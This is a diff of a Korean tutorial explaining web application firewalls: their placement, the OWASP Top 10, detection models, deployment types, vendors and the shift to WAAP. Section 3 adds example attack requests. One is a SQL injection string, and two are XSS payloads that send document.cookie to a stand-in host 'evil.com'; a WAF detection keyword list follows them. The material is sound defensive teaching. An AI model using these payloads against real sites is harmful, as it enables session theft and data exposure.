@@ -6,78 +6,182 @@
 ### 정의
 
 * **WAF (Web Application Firewall)**
-* 일반적인 방화벽(Firewall)과 달리 **웹 애플리케이션(HTTP/HTTPS)**으로 향하는 트래픽을 감시하고 필터링하는 보안 시스템
+* 일반적인 방화벽(Firewall)과 달리 **웹 애플리케이션(HTTP/HTTPS)** 으로 향하는 트래픽을 감시하고 필터링하는 보안 시스템
 * OSI 7계층 중 **Application Layer (Layer 7)** 에서 동작
+* HTTP 요청의 **Header, URL, Parameter, Body** 등 모든 구성 요소를 심층 분석
+
+### 네트워크 내 WAF 위치
 
 ```mermaid
 graph LR
-    Client[사용자/해커] -- "HTTP/HTTPS 요청" --> Internet((인터넷))
-    Internet --> Firewall[L4 네트워크 방화벽]
-    
-    subgraph "내부망"
-    Firewall -- "포트 80/443 허용" --> WAF(웹방화벽)
-    WAF -- "① 정상 트래픽 검증" --> WebServer[웹 서버 / DB]
-    WAF -- "② 악성 페이로드 차단" --> Block(X)
-    end
+    Client["사용자 / 해커"] -- "HTTP/HTTPS 요청" --> Internet((인터넷))
+    Internet --> Firewall["L3/L4<br>네트워크 방화벽"]
 
+    subgraph "내부 보안 구간"
+    Firewall -- "포트 80/443 허용" --> WAF["🛡️ 웹방화벽<br>WAF"]
+    WAF -- "정상 트래픽" --> WebServer["웹 서버"]
+    WAF -. "악성 트래픽 차단" .-> Block["차단"]
+    WebServer --> DB[(Database)]
+    end
 
     style WAF fill:#e74c3c,stroke:#c0392b,stroke-width:3px,color:white,font-weight:bold
     style WebServer fill:#2ecc71,stroke:#27ae60,color:white
+    style DB fill:#2ecc71,stroke:#27ae60,color:white
     style Block fill:#95a5a6,color:white
+    style Firewall fill:#3498db,color:white
 ```
 
 ### 핵심 역할
 
-1. **해킹 방어:** SQL Injection, XSS 등 웹 공격 차단
-2. **정보 보호:** 개인정보, 카드정보 유출 방지
-3. **접근 제어:** 부정 로그인 및 비정상 트래픽(Bot) 제어
+1. **해킹 방어:** SQL Injection, XSS, 파일 업로드 공격 등 웹 공격 차단
+2. **정보 유출 방지:** 주민등록번호, 카드번호 등 개인정보 유출 탐지 및 차단
+3. **접근 제어:** 부정 로그인, 비정상 트래픽(Bot), 무차별 대입 공격 제어
+4. **규정 준수:** PCI DSS, 개인정보보호법 등 컴플라이언스 요건 충족
+5. **가용성 보호:** L7 DDoS 등 애플리케이션 계층 공격으로부터 서비스 보호
 
-> **💡 핵심:** 방문객의 가방 속 내용물(패킷 데이터)까지 검사하는 '보안 검색대' 역할
+> **공항 보안에 비유하면?**
+
+| 구분 | 공항 비유 | 실제 동작 |
+| :--- | :--- | :--- |
+| **방화벽** | 탑승권 확인 요원 — "이 게이트(Port)로 갈 수 있는 표(IP)를 가지고 있나요?" 만 확인. 가방은 열어보지 않음 | IP/Port만 검사하고 통과시킴 |
+| **IPS** | 수배자 명단 대조 — 지나가는 사람의 얼굴을 수배 사진(시그니처)과 비교. 알려진 범죄자만 잡을 수 있음 | 알려진 공격 패턴과 대조하여 차단 |
+| **WAF** | 보안 검색대 — 가방을 X-ray로 투시하고, 내용물(페이로드)을 하나하나 검사. 위험물(악성 코드)을 직접 찾아냄 | HTTP 요청의 URL, 파라미터, Body를 심층 분석하여 차단 |
 
 ---
 
 ## 2. 왜 WAF가 필요한가? (도입 배경)
+
+### 웹 공격 현황
+
+```mermaid
+pie title 웹 보안 사고 유형별 비율 (Verizon DBIR 기반)
+    "웹 애플리케이션 공격" : 43
+    "내부자 위협" : 18
+    "악성코드" : 17
+    "소셜 엔지니어링" : 12
+    "기타" : 10
+```
+
+* 전체 보안 침해 사고의 **약 43%가 웹 애플리케이션을 대상**으로 발생 (Verizon DBIR)
+* 웹 기반 비즈니스 확대에 따라 공격 표면(Attack Surface)이 지속 증가
+* 클라우드 전환, API 경제 확대로 보호 대상이 복잡해지는 추세
 
 ### 기존 방화벽(Network Firewall)의 한계
 
 * **IP/Port 기반 제어:** "누가(IP) 어디로(Port) 가는가"만 확인
 * **Payload 분석 불가:** 패킷 안에 악성 코드가 심어져 있는지 확인 불가
 * **웹 트래픽 허용:** 웹 서비스 포트(80, 443)는 항상 열려 있어야 하므로 무방비
+* **SSL/TLS 미지원:** 암호화된 트래픽 내부를 볼 수 없어 HTTPS 공격에 무력
+
+### 방화벽만 있을 때의 공격 시나리오
 
 ```mermaid
 sequenceDiagram
     autonumber
-    participant Attacker as 해커
+    participant Attacker as 🔴 해커
     participant L4FW as L4 방화벽
     participant WebServer as 웹 서버
+    participant DB as DB
 
-    Note over L4FW: 정책: 80번 포트 허용
-    Attacker->>L4FW: HTTP 요청 (내부: SQL Injection 공격 코드 포함)
-    Note right of L4FW: IP/Port 확인... 80번 포트네? 통과!
+    Note over L4FW: 정책: 80/443 포트 허용
+    Attacker->>L4FW: HTTP 요청 (SQL Injection 포함)
+    Note right of L4FW: IP/Port만 확인<br>80번 포트 → 통과!
     L4FW->>WebServer: 공격 패킷 그대로 전달
-    Note over WebServer: 🚨 DB 데이터 유출 발생!
+    WebServer->>DB: 조작된 SQL 쿼리 실행
+    DB-->>WebServer: 전체 사용자 정보 반환
+    WebServer-->>Attacker: 개인정보 유출 완료
+    Note over Attacker,DB: 🚨 수만 건의 고객 정보 유출!
+```
+
+### WAF가 있을 때의 방어 시나리오
+
+```mermaid
+sequenceDiagram
+    autonumber
+    participant Attacker as 🔴 해커
+    participant WAF as 🛡️ WAF
+    participant WebServer as 웹 서버
+    participant DB as DB
+
+    Attacker->>WAF: HTTP 요청 (SQL Injection 포함)
+    Note right of WAF: 요청 분석 시작<br>파라미터에서<br>공격 패턴 탐지!
+    WAF-->>Attacker: 403 Forbidden (차단)
+    Note over WAF: 공격 로그 기록 및 관리자 알림
+    Note over WebServer,DB: 서버와 DB에 공격이 도달하지 않음
 ```
 
 ### 웹 공격의 위험성
 
-* **데이터 유출:** DB 해킹을 통한 고객 정보 탈취
-* **서비스 마비:** 웹 서버 리소스 고갈
-* **신뢰도 하락:** 홈페이지 변조 및 악성코드 유포지로 악용
+| 위험 유형 | 상세 내용 | 피해 규모 (예시) |
+| :--- | :--- | :--- |
+| **데이터 유출** | DB 해킹을 통한 고객 정보 탈취 | 수십만~수억 건 개인정보 유출 |
+| **금전적 손실** | 과징금, 소송 비용, 복구 비용 | 수십억 원 이상 |
+| **서비스 마비** | 웹 서버 리소스 고갈 (DDoS) | 시간당 수억 원 매출 손실 |
+| **신뢰도 하락** | 홈페이지 변조, 악성코드 유포지로 악용 | 기업 이미지 훼손, 고객 이탈 |
+| **법적 책임** | 개인정보보호법, 정보통신망법 위반 | 형사 처벌, 영업 정지 |
 
 ---
 
-## 3. 주요 방어 대상 (OWASP Top 10)
+## 3. 주요 방어 대상 (OWASP Top 10 - 2021)
 
-가장 빈번하게 발생하는 웹 취약점을 중점 방어합니다.
+OWASP(Open Web Application Security Project)에서 발표하는 **가장 심각한 웹 보안 위협 10가지**를 중점 방어합니다.
 
-1. **SQL Injection (SQL 삽입):**
-    * DB 쿼리를 조작하여 데이터 유출 및 삭제
-2. **XSS (Cross Site Scripting):**
-    * 악성 스크립트를 삽입하여 사용자 세션 탈취
-3. **Broken Authentication (인증 취약점):**
-    * 로그인 기능 우회 및 계정 탈취
-4. **Security Misconfiguration:**
-    * 서버의 기본 설정 미흡으로 인한 정보 노출
+### 주요 항목 상세
+
+| 순위 | 항목 | 설명 | WAF 방어 |
+| :---: | :--- | :--- | :---: |
+| **A01** | Broken Access Control | 권한 없는 리소스에 대한 비인가 접근 | O |
+| **A02** | Cryptographic Failures | 민감 데이터의 암호화 미흡 | △ |
+| **A03** | Injection (SQLi, XSS 등) | SQL/OS 쿼리에 악성 코드 삽입 | **O** |
+| **A04** | Insecure Design | 설계 단계의 보안 결함 | △ |
+| **A05** | Security Misconfiguration | 불필요한 기능 활성화, 기본 설정 방치 | O |
+| **A06** | Vulnerable Components | 알려진 취약점이 있는 라이브러리 사용 | O |
+| **A07** | Auth & Identification Failures | 인증 우회, 무차별 대입 공격 | **O** |
+| **A08** | Data Integrity Failures | 신뢰할 수 없는 직렬화 | △ |
+| **A09** | Logging & Monitoring Failures | 보안 이벤트 로깅 부재 | O (로깅) |
+| **A10** | SSRF | 서버가 의도치 않은 내부 요청을 수행 | **O** |
+
+> **O** = WAF로 효과적 방어 가능 / **△** = WAF 단독으로는 제한적, 추가 보안 조치 필요
+
+### 대표 공격 예시: SQL Injection
+
+```
+# 정상 요청
+GET /users?id=123
+
+# 공격 요청 (SQL Injection)
+GET /users?id=123' OR '1'='1' --
+
+# 서버에서 실행되는 쿼리
+정상: SELECT * FROM users WHERE id = '123'
+공격: SELECT * FROM users WHERE id = '123' OR '1'='1' --'
+      → 조건이 항상 참이 되어 전체 사용자 정보 유출
+```
+
+```mermaid
+flowchart LR
+    A["공격 요청<br>id=123' OR '1'='1'"] --> WAF{"🛡️ WAF 검사"}
+    WAF -->|"공격 패턴 탐지"| BLOCK["🚫 차단"]
+    WAF -->|"정상 요청"| PASS["✅ 통과"]
+
+    style WAF fill:#e74c3c,color:white,font-weight:bold
+    style BLOCK fill:#95a5a6,color:white
+    style PASS fill:#2ecc71,color:white
+```
+
+### 대표 공격 예시: XSS (Cross-Site Scripting)
+
+```
+# Reflected XSS 공격
+GET /search?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
+
+# Stored XSS 공격 (게시판 등)
+POST /comment
+Body: content=<img src=x onerror="fetch('http://evil.com/steal?c='+document.cookie)">
+
+# WAF 탐지 포인트
+→ <script>, onerror=, javascript:, document.cookie 등의 패턴을 탐지하여 차단
+```
 
 ---
 
@@ -86,33 +190,179 @@ sequenceDiagram
 | 구분 | 방화벽 (Firewall) | IPS (침입방지시스템) | **WAF (웹방화벽)** |
 | :--- | :--- | :--- | :--- |
 | **대응 계층** | L3 / L4 (Network) | L3 ~ L7 | **L7 (Application)** |
-| **판단 기준** | IP, Port | 패턴(Signature) | **URL, Parameter, Body** |
-| **주요 목적** | 네트워크 접근 제어 | 웜, 바이러스 차단 | **웹 해킹 방어, 정보보호** |
-| **HTTPS 검사** | 불가능 | 제한적 | **가능 (복호화 분석)** |
+| **판단 기준** | IP, Port | 패턴(Signature) | **URL, Parameter, Cookie, Body** |
+| **주요 목적** | 네트워크 접근 제어 | 알려진 공격 탐지/차단 | **웹 해킹 방어, 정보 유출 방지** |
+| **HTTPS 검사** | 불가능 | 제한적 | **가능 (SSL 복호화 분석)** |
+| **오탐률** | 낮음 | 중간 | 초기 높으나 튜닝으로 개선 |
+| **웹 공격 대응** | 불가 | 부분적 | **전문적 대응** |
 
-> **📌 요약:** 웹 공격(L7)을 막으려면 웹 전용 방화벽(WAF)이 필수
-
----
-
-## 5. 동작 방식 및 배포 형태
-
-## 동작 방식 (Filtering)
-
-* **Blacklist (네거티브):** 알려진 공격 패턴만 차단 (관리 용이)
-* **Whitelist (포지티브):** 허용된 안전한 접근만 통과 (보안성 높음)
-* **Hybrid:** 위 두 방식의 혼합 (일반적)
-
-## 배포 형태의 변화
-
-1. **하드웨어형 (Appliance):** 고성능, 사내 구축 (비용 높음)
-2. **소프트웨어형 (S/W):** 웹 서버에 직접 설치 (서버 부하 가능성)
-3. **클라우드형 (Cloud WAF):** AWS, Cloudflare 등 (도입 쉬움, 트래픽 종량제)
+> **요약:** 보안 장비는 역할이 다르므로 **대체 관계가 아닌 상호 보완 관계**입니다. 웹 공격(L7)을 효과적으로 막으려면 WAF가 필수입니다.
 
 ---
 
-## 6. 최신 트렌드: WAAP로의 진화
+## 5. WAF 동작 방식
 
-WAF는 이제 **WAAP (Web Application and API Protection)** 로 진화 중입니다.
+### 요청 처리 흐름
+
+```mermaid
+flowchart TD
+    REQ["클라이언트 HTTP 요청"] --> PARSE["요청 파싱 및 정규화"]
+    PARSE --> BL{"Blacklist 검사<br>공격 패턴 매칭"}
+    BL -->|"패턴 탐지"| BLOCK["🚫 차단<br>403 응답"]
+    BL -->|"패턴 없음"| WL{"Whitelist 검사<br>허용 규칙 확인"}
+    WL -->|"허용됨"| PASS["✅ 정상 통과"]
+    WL -->|"미확인"| LOG["로그 기록 후 통과"]
+    PASS --> SERVER["웹 서버"]
+    LOG --> SERVER
+
+    style REQ fill:#3498db,color:white
+    style BLOCK fill:#e74c3c,color:white,font-weight:bold
+    style PASS fill:#2ecc71,color:white
+    style SERVER fill:#2ecc71,color:white
+```
+
+### 탐지 방식 비교
+
+| 방식 | 설명 | 장점 | 단점 |
+| :--- | :--- | :--- | :--- |
+| **Blacklist (네거티브 모델)** | 알려진 공격 패턴(시그니처)만 차단 | 관리 용이, 오탐 낮음 | Zero-day 공격 탐지 불가 |
+| **Whitelist (포지티브 모델)** | 허용된 안전한 접근만 통과, 나머지 차단 | 알려지지 않은 공격도 방어 가능 | 초기 설정 부담 큼 |
+| **Hybrid (혼합)** | Blacklist + Whitelist 조합 | 균형 잡힌 보안 수준 | 복합 운영 관리 필요 |
+| **AI/ML 기반 (행위 분석)** | 정상 트래픽 학습 후 이상 행위 탐지 | Zero-day, 변종 공격 탐지 | 학습 기간 필요, 오탐 가능성 |
+
+---
+
+## 6. 배포 형태
+
+```mermaid
+graph TB
+    subgraph HW["1. 하드웨어형"]
+        direction LR
+        HW_CLIENT[클라이언트] --> HW_WAF["물리 WAF 장비"]
+        HW_WAF --> HW_SERVER[웹 서버]
+    end
+
+    subgraph SW["2. 소프트웨어형"]
+        direction LR
+        SW_CLIENT[클라이언트] --> SW_SERVER["웹 서버 + WAF 모듈"]
+    end
+
+    subgraph CLOUD["3. 클라우드형"]
+        direction LR
+        CL_CLIENT[클라이언트] --> CL_WAF["Cloud WAF"]
+        CL_WAF --> CL_SERVER[웹 서버]
+    end
+
+    style HW_WAF fill:#e74c3c,color:white,font-weight:bold
+    style SW_SERVER fill:#f39c12,color:white,font-weight:bold
+    style CL_WAF fill:#3498db,color:white,font-weight:bold
+```
+
+| 구분 | 하드웨어형 | 소프트웨어형 | 클라우드형 |
+| :--- | :--- | :--- | :--- |
+| **설치 위치** | 네트워크 인라인 (전용 장비) | 웹 서버 내부 (모듈) | 클라우드 (DNS 변경) |
+| **초기 비용** | 높음 (수천만~수억 원) | 중간 | 낮음 (구독형) |
+| **운영 비용** | 전문 인력 필요 | 서버 리소스 소모 | 트래픽 종량제 |
+| **성능** | 대용량 트래픽 처리에 유리 | 서버 부하 영향 가능 | CDN 연계 시 우수 |
+| **확장성** | 장비 추가 구매 필요 | 서버 단위 설치 | 자동 확장 (탄력적) |
+| **유지보수** | 직접 관리 | 직접 관리 | 벤더가 관리 |
+| **대표 사례** | WAPPLES, Imperva | ModSecurity, NAXSI | AWS WAF, Cloudflare |
+| **적합 환경** | 대기업, 금융기관, 공공기관 | 소규모 환경, 단일 서버 | 스타트업, 클라우드 네이티브 |
+
+---
+
+## 7. 주요 WAF 제품/서비스
+
+### 국내
+
+| 제품명 | 제조사 | 특징 |
+| :--- | :--- | :--- |
+| **WAPPLES** | 펜타시큐리티 | 국내 시장점유율 1위, 지능형 논리 분석 엔진(COCEP) |
+| **WEBFRONT-K** | 파이오링크 | 고성능 하드웨어 WAF, L7 DDoS 방어 |
+| **ShadowWall** | 이글루코퍼레이션 | 국정원 CC 인증, 행위 기반 탐지 |
+| **Cloudbric** | 펜타시큐리티 | 클라우드 기반 WAF, 글로벌 서비스 |
+
+### 글로벌
+
+| 제품/서비스명 | 제조사 | 특징 |
+| :--- | :--- | :--- |
+| **AWS WAF** | Amazon | AWS 네이티브, Managed Rules, 서버리스 연동 |
+| **Cloudflare WAF** | Cloudflare | CDN 통합, DDoS 방어, 무료 플랜 제공 |
+| **Imperva WAF** | Imperva (Thales) | 엔터프라이즈급, 온프레미스/클라우드 |
+| **Akamai App & API Protector** | Akamai | 글로벌 CDN 기반, API 보안 통합 |
+| **Azure WAF** | Microsoft | Azure 네이티브, Application Gateway 통합 |
+| **ModSecurity** | OWASP/Trustwave | 오픈소스 WAF, Apache/Nginx 모듈 |
+
+---
+
+## 8. WAF 도입 시 고려사항
+
+| 항목 | 설명 |
+| :--- | :--- |
+| **성능 영향** | WAF 도입 시 응답 지연(Latency) 발생 가능. 트래픽 규모에 맞는 처리 용량 확보 필요 |
+| **오탐(False Positive) 관리** | 정상 요청을 공격으로 오인하여 차단하는 경우 발생. 충분한 튜닝 기간 필요 |
+| **미탐(False Negative) 최소화** | 실제 공격을 탐지하지 못하는 경우. 최신 룰 업데이트 및 AI 기반 탐지 활용 |
+| **SSL/TLS 처리** | HTTPS 트래픽 복호화에 따른 성능 부하와 인증서 관리 고려 |
+| **운영 인력** | 로그 분석, 정책 튜닝, 장애 대응 등을 위한 보안 전문 인력 확보 |
+| **이중화/가용성** | WAF 장애 시 서비스 중단을 방지하기 위한 HA(고가용성) 구성 |
+
+---
+
+## 9. WAF의 한계와 보완
+
+### WAF가 막을 수 없는 것들
+
+```mermaid
+graph LR
+    subgraph "WAF 방어 가능 ✅"
+        A1["SQL Injection"]
+        A2["XSS"]
+        A3["파일 업로드 공격"]
+        A4["디렉토리 탐색"]
+    end
+
+    subgraph "WAF 단독 방어 한계 ⚠️"
+        B1["비즈니스 로직 취약점"]
+        B2["제로데이 공격"]
+        B3["내부자 위협"]
+        B4["설계 결함"]
+    end
+
+    style A1 fill:#2ecc71,color:white
+    style A2 fill:#2ecc71,color:white
+    style A3 fill:#2ecc71,color:white
+    style A4 fill:#2ecc71,color:white
+    style B1 fill:#e74c3c,color:white
+    style B2 fill:#e74c3c,color:white
+    style B3 fill:#e74c3c,color:white
+    style B4 fill:#e74c3c,color:white
+```
+
+| 한계점 | 설명 | 보완 방법 |
+| :--- | :--- | :--- |
+| **비즈니스 로직 공격** | "정상적인" 요청으로 비즈니스 규칙을 악용 (예: 가격 변조) | 애플리케이션 레벨 검증 |
+| **제로데이 공격** | 아직 알려지지 않은 새로운 공격 패턴 | AI/ML 기반 이상 탐지 |
+| **내부자 위협** | WAF는 외부 진입점만 감시 | 내부 접근 제어(IAM), DLP |
+| **설계 결함** | 애플리케이션 자체의 구조적 보안 문제 | 시큐어 코딩, 보안 설계 검토 |
+
+> WAF는 다계층 보안 체계의 한 요소로, **다른 보안 솔루션(IPS, SIEM, 취약점 스캐너 등)과 함께** 운영해야 합니다.
+
+---
+
+## 10. 최신 트렌드: WAAP로의 진화
+
+기존 WAF는 이제 **WAAP (Web Application and API Protection)** 로 진화하고 있습니다.
+
+### 진화 과정
+
+```mermaid
+timeline
+    title WAF의 진화 과정
+    2000년대 초반 : 1세대 WAF : 시그니처 기반 패턴 매칭
+    2010년대 : 2세대 WAF : 행위 기반 탐지 도입 : SSL 복호화 지원
+    2015년~ : 차세대 WAF : AI/ML 기반 지능형 탐지 : Bot 관리 기능 추가
+    2020년~ : WAAP : WAF + API 보안 + Bot 관리 + DDoS 방어 : 클라우드 네이티브
+```
 
 ```mermaid
 mindmap
@@ -127,17 +377,33 @@ mindmap
     (Bot 관리)
       악성 크롤러 차단
       매크로/티켓팅 봇 대응
-      계정 도용 방지
+      계정 탈취 방지
     [DDoS 방어]
       L7 애플리케이션 DDoS
-      Slowloris 공격 방어
+      HTTP Flood 방어
 ```
 
-## WAAP의 4대 핵심 요소
+### WAAP의 4대 핵심 요소
 
-1. **WAF:** 전통적인 웹 공격 방어
-2. **API Security:** 모바일/MSA 환경의 API 취약점 방어
-3. **Bot Management:** 매크로, 크롤러, 디도스 봇 차단
-4. **DDoS Protection:** L7(애플리케이션) 레벨의 디도스 방어
+| 요소 | 설명 | 대응 위협 |
+| :--- | :--- | :--- |
+| **WAF** | 전통적인 웹 공격 방어 (SQLi, XSS 등) | OWASP Top 10 |
+| **API Security** | API 엔드포인트 보호, 스키마 검증 | API 남용, 데이터 유출 |
+| **Bot Management** | 악성 봇 식별 및 차단, 정상 봇 허용 | 스크래핑, 계정 탈취, 매크로 |
+| **DDoS Protection** | L7 계층 DDoS 공격 방어 | HTTP Flood, Slowloris |
+
+### 왜 WAAP가 필요한가?
+
+```mermaid
+pie title 현대 웹 트래픽 구성 비율
+    "API 트래픽" : 50
+    "웹 브라우저 트래픽" : 25
+    "봇 트래픽 (정상)" : 10
+    "악성 봇 트래픽" : 15
+```
+
+* 현대 웹 트래픽의 **50% 이상이 API** 를 통해 발생 (모바일 앱, SPA, 마이크로서비스)
+* 전체 인터넷 트래픽의 **약 30%가 봇** 이며, 이 중 상당수가 악성
+* 기존 WAF만으로는 API 공격과 정교한 봇을 효과적으로 방어하기 어려움
 
 ---
